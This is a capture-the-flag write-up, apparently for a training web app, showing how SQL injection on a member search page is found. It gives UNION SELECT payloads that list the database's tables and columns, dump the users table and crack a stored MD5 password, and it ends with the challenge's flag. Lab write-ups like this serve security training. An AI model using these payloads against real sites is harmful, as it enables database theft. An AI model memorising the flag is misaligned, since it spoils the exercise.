First flag!

Resource used 
https://www.sqlinjection.net/column-names/

::Note::
In MySQL, the table information_schema.tables contains all the metadata related to table objects. Below is listed the most useful information of this table.

table_name: The name of the table.
column_name: The name of the column.
data_type: Specifies the data type (MySQL data type).
column_default: Default value inserted in the column.
is_nullable: Indicates whether the column can contain null or not.



1.) Navigate to the member page 

http://192.168.1.100/index.php?page=member


Now that we are on the page here we can try for simple sql Injection by passing 1 , 1=1 or even passing 1 or 1 = 1
In doing this we see that data is being returned from the database so we try to get data from the tables in the database using SQL injection

2.) Trying to exctract data from the database
--> Insert the following into the search bar to see the name of the table
''
-1  UNION SELECT  table_name, 1 FROM information_schema.tables where table_schema = database() 
''
after running that you find that the table name is 'users'

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--> for Columns 
''
-1  UNION SELECT  column_name, 1 FROM information_schema.columns where table_schema = database() 
''
when we run that we get the following names back 

user_id
first_name
last_name
town
country 
planet
commentaire
countersign 

3.) Getting the users on the site from the information we have just gotten
''  
    -1 UNION SELECT null, concat (user_id,first_name,last_name,town,country ,planet,commentaire,countersign) from users 
''

Then we get the following in our results

ID: -1 union select null, concat (user_id, first_name, last_name, town, country, planet, commentaire, countersign) from users 
First name: 
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28


4.) So from the surname property we see to decode the password using MD5 then lowercasing the password 

MD5 decrpyt result = FortyTwo
lowercased = fortytwo

After running sha 256 calculator on the lowercased result = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

Well done we found the first flag!
